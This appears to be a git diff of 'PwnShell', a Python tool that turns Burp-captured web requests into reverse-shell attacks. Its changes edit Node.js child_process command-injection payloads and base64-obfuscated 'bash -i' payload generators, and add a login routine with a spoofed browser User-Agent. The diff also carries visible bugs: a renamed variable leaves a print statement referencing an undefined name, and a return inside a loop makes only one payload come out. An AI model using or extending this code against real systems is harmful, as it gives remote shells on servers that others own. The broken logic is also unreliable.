@@ -197,10 +197,13 @@ class PwnShell:
     #########################################################################################
     ###################################  LOGIN   ############################################
 
-    def login(self):
-        pass
+    def login(self):   #ADD a condition so that if the post data isnt provided he must provide
+        url = self.domain
+        data = self.data
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close","Upgrade-Insecure-Requests": "1",'Content-Type': 'application/x-www-form-urlencoded'}
+        req=requests.post(url,headers=headers,data=data)
 
-    ######################################################################################
+    ########################################################################################
     ###################################  PARSER BURPREQUEST #################################
     def parse_file(self):
         payloads = PayLoads(self.ip, self.port).payloads()
@@ -226,9 +229,6 @@ class PwnShell:
                 req = requests.get(url,headers=request,verify=False)
                 print(req.status_code)
             time.sleep(5)
-            #if self.is_port_in_use():
-                #print("the port is in use")
-                #break
 
     #########################################################################################
     ###################################  NODEJS PAYLOADS ####################################
@@ -236,9 +236,8 @@ class PwnShell:
         payloads = PayLoads(self.ip, self.port).payloads()
         for ini_payload in payloads:
             encoded_payload = self.get_url_encoded_payload(ini_payload)
-            payload=f'''require('child_process').exec('{encoded_payload}')'''
+            nodejs_payload=f'''require('child_process').exec('{encoded_payload}')'''
             print(payload)
-
 
     #############################################################################################
     ###################################  BASE64 ENCODING PAYLOADS ###############################
@@ -247,8 +246,9 @@ class PwnShell:
         for payload in payloads:
             cli = payload.encode("utf-8")
             encoded = base64.b64encode(cli).decode('utf-8')
-            base_payload = "bash -c '{echo," + f"{encoded}" + "}|{base64,-d}|{bash,-i}'"
-            print(base_payload)
+            base64_payload = "bash -c '{echo," + f"{encoded}" + "}|{base64,-d}|{bash,-i}'"
+            return base64_payload
+
     #########################################################################################
     ###################################  ENCODING PAYLOADS #################################
 
@@ -291,7 +291,6 @@ if __name__ == '__main__':
         parser.add_argument("-c", "--cookie", help='Enter Cookie')
         parser.add_argument("-k", "--header", help='Provide header')
         parser.add_argument("-m", "--method", help='Request Method', default='post')
-        parser.add_argument("-a", "--auth", help='[USERNAME PASSWORD]', nargs=2)
         args = parser.parse_args()
         ########################################################################
         ########################## Defining variables ##########################
